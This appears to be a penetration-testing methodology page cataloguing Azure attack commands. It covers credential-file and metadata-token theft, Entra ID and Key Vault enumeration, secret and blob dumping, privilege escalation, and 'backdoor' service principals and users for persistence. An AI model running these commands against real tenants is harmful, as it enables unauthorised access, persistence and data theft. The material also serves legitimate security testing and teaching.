---
title: Azure Attack Patterns
category: methodology
tags:
  - azure
  - cloud
  - azuread
  - managed-identity
  - keyvault
  - pentesting
last_updated: 2025-12-28
---

# Azure Attack Patterns

## Table of Contents

- [Overview](#overview)
- [Initial Access](#initial-access)
- [Azure AD Enumeration](#azure-ad-enumeration)
- [Managed Identity Exploitation](#managed-identity-exploitation)
- [Storage Account Misconfigurations](#storage-account-misconfigurations)
- [Key Vault Access](#key-vault-access)
- [Azure Functions Attacks](#azure-functions-attacks)
- [Common Azure Tools](#common-azure-tools)
- [Post-Exploitation](#post-exploitation)

---

## Overview

Azure (Microsoft Azure) integrates tightly with Microsoft 365 and Azure Active Directory. Key attack surfaces include:

- **Azure AD (Entra ID)**: Identity and access management
- **Managed Identity**: Service authentication
- **Storage Accounts**: Blob, file, queue, and table storage
- **Key Vault**: Secrets, keys, and certificate management
- **Azure Functions**: Serverless compute
- **Azure VMs**: Virtual machines with metadata service

---

## Initial Access

### Credential Sources

```bash
# Environment variables
env | grep -i azure

# Azure CLI credentials (Linux)
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json

# Azure CLI credentials (Windows)
type %USERPROFILE%\.azure\accessTokens.json

# Azure PowerShell tokens
# Stored in TokenCache.dat

# Managed Identity endpoint
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Credential Validation

```bash
# Check current account
az account show

# List subscriptions
az account list

# Get access token
az account get-access-token

# Get access token for specific resource
az account get-access-token --resource https://graph.microsoft.com
```

### Authentication Methods

```bash
# Interactive login
az login

# Service principal login
az login --service-principal -u APP_ID -p PASSWORD --tenant TENANT_ID

# Managed identity login (from Azure resource)
az login --identity

# Device code flow
az login --use-device-code
```

---

## Azure AD Enumeration

### Tenant and User Enumeration

```bash
# Get tenant ID from domain
curl https://login.microsoftonline.com/DOMAIN.com/.well-known/openid-configuration

# List users (requires permissions)
az ad user list

# Get specific user
az ad user show --id user@domain.com

# Search users
az ad user list --filter "startswith(displayName,'admin')"

# Get current user
az ad signed-in-user show
```

### Group Enumeration

```bash
# List all groups
az ad group list

# Get group members
az ad group member list --group "Group Name"

# Check group membership
az ad group member check --group "Admins" --member-id USER_OBJECT_ID

# List groups for user
az ad user get-member-groups --id user@domain.com
```

### Role Enumeration

```bash
# List Azure AD roles
az rest --method GET --uri "https://graph.microsoft.com/v1.0/directoryRoles"

# List role assignments for user
az role assignment list --assignee user@domain.com

# List all role assignments in subscription
az role assignment list --all

# Get role definition
az role definition list --name "Contributor"
```

### Application and Service Principal Enumeration

```bash
# List applications
az ad app list

# Get application details
az ad app show --id APP_ID

# List service principals
az ad sp list

# Get service principal credentials (if owner)
az ad sp credential list --id SP_OBJECT_ID

# List app role assignments
az rest --method GET \
    --uri "https://graph.microsoft.com/v1.0/servicePrincipals/SP_ID/appRoleAssignedTo"
```

### High-Value Targets

| Role | Description | Risk |
|------|-------------|------|
| Global Administrator | Full tenant control | Critical |
| Privileged Role Administrator | Manage role assignments | Critical |
| Application Administrator | Manage all applications | High |
| Cloud Application Administrator | Manage cloud apps | High |
| User Administrator | Manage users | Medium |
| Groups Administrator | Manage groups | Medium |

---

## Managed Identity Exploitation

### Types of Managed Identity

1. **System-assigned**: Tied to specific resource lifecycle
2. **User-assigned**: Independent resource, can be shared

### Metadata Service Access

```bash
# Get access token from Azure VM
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get token for different resources
# Azure Resource Manager
resource=https://management.azure.com/

# Microsoft Graph
resource=https://graph.microsoft.com/

# Key Vault
resource=https://vault.azure.net/

# Storage
resource=https://storage.azure.com/
```

### Using Managed Identity Tokens

```bash
# Extract token
TOKEN=$(curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq -r '.access_token')

# Use token with Azure CLI
az account get-access-token

# Use token with REST API
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### Instance Metadata Service (IMDS)

```bash
# Get instance metadata
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get subscription ID
curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text"

# Get resource group
curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text"
```

---

## Storage Account Misconfigurations

### Storage Account Enumeration

```bash
# List storage accounts
az storage account list

# Get storage account properties
az storage account show --name ACCOUNT_NAME --resource-group RG_NAME

# Check public access setting
az storage account show --name ACCOUNT_NAME --query "allowBlobPublicAccess"

# List containers
az storage container list --account-name ACCOUNT_NAME

# Check container access level
az storage container show --name CONTAINER --account-name ACCOUNT_NAME --query "properties.publicAccess"
```

### Anonymous Access Testing

```bash
# List blobs in public container
az storage blob list --container-name CONTAINER --account-name ACCOUNT_NAME --auth-mode anonymous

# Download public blob
az storage blob download --container-name CONTAINER --name BLOB_NAME \
    --account-name ACCOUNT_NAME --file ./downloaded_file --auth-mode anonymous

# Direct URL access
curl "https://ACCOUNT_NAME.blob.core.windows.net/CONTAINER/BLOB_NAME"
```

### Access Key Enumeration

```bash
# List access keys (requires permissions)
az storage account keys list --account-name ACCOUNT_NAME --resource-group RG_NAME

# Use access key
az storage blob list --container-name CONTAINER \
    --account-name ACCOUNT_NAME --account-key "KEY"
```

### SAS Token Exploitation

```bash
# Generate SAS token (if you have keys)
az storage container generate-sas --name CONTAINER \
    --account-name ACCOUNT_NAME --account-key "KEY" \
    --permissions rl --expiry 2025-12-31

# Use SAS token
az storage blob list --container-name CONTAINER \
    --account-name ACCOUNT_NAME --sas-token "SAS_TOKEN"

# Check for SAS token in URLs
# https://account.blob.core.windows.net/container/blob?sv=2020-02-10&ss=b&srt=co&sp=rl&...
```

### Common Misconfigurations

| Issue | Risk | Check |
|-------|------|-------|
| Public container | Data exposure | `publicAccess: container` |
| Public blob | Individual file exposure | `publicAccess: blob` |
| Shared access keys | Unrestricted access | Keys in code/config |
| Overly permissive SAS | Excessive permissions | SAS `sp` parameter |
| HTTP enabled | Man-in-the-middle | `supportsHttpsTrafficOnly: false` |

---

## Key Vault Access

### Key Vault Enumeration

```bash
# List Key Vaults
az keyvault list

# Get Key Vault properties
az keyvault show --name VAULT_NAME

# List secrets
az keyvault secret list --vault-name VAULT_NAME

# List keys
az keyvault key list --vault-name VAULT_NAME

# List certificates
az keyvault certificate list --vault-name VAULT_NAME
```

### Accessing Secrets

```bash
# Get secret value
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME

# Download secret
az keyvault secret download --vault-name VAULT_NAME --name SECRET_NAME --file secret.txt

# Get all versions of secret
az keyvault secret list-versions --vault-name VAULT_NAME --name SECRET_NAME
```

### Key Vault Access Policies

```bash
# List access policies
az keyvault show --name VAULT_NAME --query "properties.accessPolicies"

# Check RBAC mode
az keyvault show --name VAULT_NAME --query "properties.enableRbacAuthorization"
```

### Using REST API

```bash
# Get token for Key Vault
TOKEN=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv)

# List secrets via API
curl -H "Authorization: Bearer $TOKEN" \
    "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3"

# Get secret value
curl -H "Authorization: Bearer $TOKEN" \
    "https://VAULT_NAME.vault.azure.net/secrets/SECRET_NAME?api-version=7.3"
```

---

## Azure Functions Attacks

### Function Enumeration

```bash
# List function apps
az functionapp list

# Get function app configuration
az functionapp config appsettings list --name FUNCTION_APP --resource-group RG_NAME

# List functions in app
az functionapp function list --name FUNCTION_APP --resource-group RG_NAME

# Get function keys
az functionapp function keys list --name FUNCTION_APP --function-name FUNCTION \
    --resource-group RG_NAME
```

### Environment Variable Extraction

```bash
# Get app settings (may contain secrets)
az functionapp config appsettings list --name FUNCTION_APP --resource-group RG_NAME

# Common sensitive settings:
# - Connection strings
# - API keys
# - Storage account keys
# - Database credentials
```

### Function Code Access

```bash
# Download function code (if SCM access)
az functionapp deployment source config-zip --name FUNCTION_APP \
    --resource-group RG_NAME --src ./code.zip

# Access Kudu/SCM
curl -u 'username:password' \
    "https://FUNCTION_APP.scm.azurewebsites.net/api/zip/site/wwwroot/"
```

### Function Invocation

```bash
# Get function URL
az functionapp function show --name FUNCTION_APP --function-name FUNCTION \
    --resource-group RG_NAME --query "invokeUrlTemplate"

# Invoke with function key
curl "https://FUNCTION_APP.azurewebsites.net/api/FUNCTION?code=FUNCTION_KEY"

# Invoke with host key
curl "https://FUNCTION_APP.azurewebsites.net/api/FUNCTION" \
    -H "x-functions-key: HOST_KEY"
```

---

## Common Azure Tools

### Azure CLI

```bash
# Install
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Login
az login

# Switch subscription
az account set --subscription "Subscription Name"
```

### AADInternals (PowerShell)

```powershell
# Install
Install-Module AADInternals

# Import
Import-Module AADInternals

# Get tenant info
Get-AADIntTenantDetails

# Enumerate users
Get-AADIntUsers

# Get access token
Get-AADIntAccessTokenForMSGraph
```

### ROADtools

```bash
# Install
pip install roadrecon roadlib

# Authenticate
roadrecon auth -u user@domain.com

# Gather data
roadrecon gather

# Start web interface
roadrecon gui
```

### MicroBurst

```powershell
# Import
Import-Module MicroBurst.psm1

# Enumerate storage
Invoke-EnumerateAzureBlobs -Base COMPANY

# Enumerate subdomains
Invoke-EnumerateAzureSubDomains -Base COMPANY

# Check anonymous access
Get-AzurePasswords
```

### AzureHound (BloodHound)

```bash
# Install
pip install azurehound

# Run collection
azurehound -u user@domain.com -p password

# Import to BloodHound for analysis
```

---

## Post-Exploitation

### Privilege Escalation Paths

#### 1. Role Assignment

```bash
# Assign contributor role
az role assignment create --assignee USER_ID \
    --role Contributor --scope /subscriptions/SUB_ID

# Assign custom role
az role assignment create --assignee USER_ID \
    --role "Custom Role Name" --scope /subscriptions/SUB_ID
```

#### 2. Service Principal Credential Addition

```bash
# Add credential to service principal (if owner)
az ad sp credential reset --id SP_ID --append

# Add password to application
az ad app credential reset --id APP_ID --append
```

#### 3. Group Membership

```bash
# Add user to privileged group
az ad group member add --group "Group Name" --member-id USER_OBJECT_ID
```

### Persistence Techniques

```bash
# Create new service principal
az ad sp create-for-rbac --name "backdoor-sp" --role Contributor

# Create automation runbook
az automation runbook create --automation-account-name ACCOUNT \
    --resource-group RG --name backdoor --type PowerShell

# Add user
az ad user create --display-name "Backdoor User" \
    --password "Password123!" --user-principal-name backdoor@domain.com
```

### Data Exfiltration

```bash
# Download all blobs from storage
az storage blob download-batch --destination ./exfil \
    --source CONTAINER --account-name ACCOUNT

# Export Key Vault secrets
for secret in $(az keyvault secret list --vault-name VAULT --query "[].name" -o tsv); do
    az keyvault secret show --vault-name VAULT --name $secret >> secrets.json
done

# Export database
az sql db export --admin-password PASSWORD --admin-user ADMIN \
    --name DB --server SERVER --resource-group RG \
    --storage-key KEY --storage-key-type StorageAccessKey \
    --storage-uri "https://ACCOUNT.blob.core.windows.net/CONTAINER/export.bacpac"
```

---

## See Also

- [README.md](README.md) - Cloud Pentesting Overview
- [aws.md](aws.md) - AWS Attack Patterns
- [gcp.md](gcp.md) - GCP Attack Patterns
- [kubernetes.md](kubernetes.md) - Kubernetes Security
